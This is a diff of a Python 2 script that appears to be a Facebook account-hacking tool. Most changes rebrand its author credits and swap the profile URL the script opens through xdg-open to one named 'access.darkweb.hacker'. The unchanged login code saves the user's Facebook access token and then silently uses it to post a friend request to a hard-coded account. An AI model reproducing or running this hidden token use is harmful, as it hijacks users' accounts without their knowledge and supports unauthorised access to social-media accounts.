@@ -47,16 +47,16 @@ def jalan(z):
 
 
 ##### LOGO #####
-logo = """
-░██████╗░█████╗░██╗██╗░░██╗░█████╗░
-██╔════╝██╔══██╗██║██║░██╔╝██╔══██╗
-╚█████╗░███████║██║█████═╝░██║░░██║
-░╚═══██╗██╔══██║██║██╔═██╗░██║░░██║
-██████╔╝██║░░██║██║██║░╚██╗╚█████╔╝
-╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚═╝░╚════╝░ 
+logo = """\033[1;91m▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
+\033[1;91m░██████╗░█████╗░██╗██╗░░██╗░█████╗░
+\033[1;91m██╔════╝██╔══██╗██║██║░██╔╝██╔══██╗
+\033[1;91m╚█████╗░███████║██║█████═╝░██║░░██║
+\033[1;91m░╚═══██╗██╔══██║██║██╔═██╗░██║░░██║
+\033[1;91m██████╔╝██║░░██║██║██║░╚██╗╚█████╔╝
+\033[1;91m╚═════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚═╝░╚════╝░ 
 \033[1;91m=======================================
 \033[1;96mAuthor  \033[1;93m: \033[1;92mNazmul Tufan
-\033[1;96mFacebook  \033[1;93m: \033[1;92mRobert Jason
+\033[1;96mFacebook  \033[1;93m: \033[1;92mNazmul Tufan
 \033[1;91m======================================="""
 
 def tik():
@@ -77,8 +77,8 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ============================================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mAbid Nazmul Tufan
-\033[1;96mFacebook  \033[1;93m: \033[1;92mAbid Khan
+\033[1;96mAuthor  \033[1;93m: \033[1;92mNazmul Tufan
+\033[1;96mFacebook  \033[1;93m: \033[1;92mNazmul Tufan
 \033[1;91m======================================="""
 print " \x1b[1;93m============================================================="
 
@@ -95,10 +95,10 @@ while (loop == 'true'):
             loop = 
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.facebook.com/profile.php?id=100027112667918')
+            os.system('xdg-open https://www.facebook.com/access.darkweb.hacker')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100027112667918')
+        os.system('xdg-open https://www.facebook.com/access.darkweb.hacker')
 
 def login():
 	os.system('clear')
@@ -139,7 +139,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.facebook.com/profile.php?id=100027112667918')
+				os.system('xdg-open https://www.facebook.com/access.darkweb.hacker')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
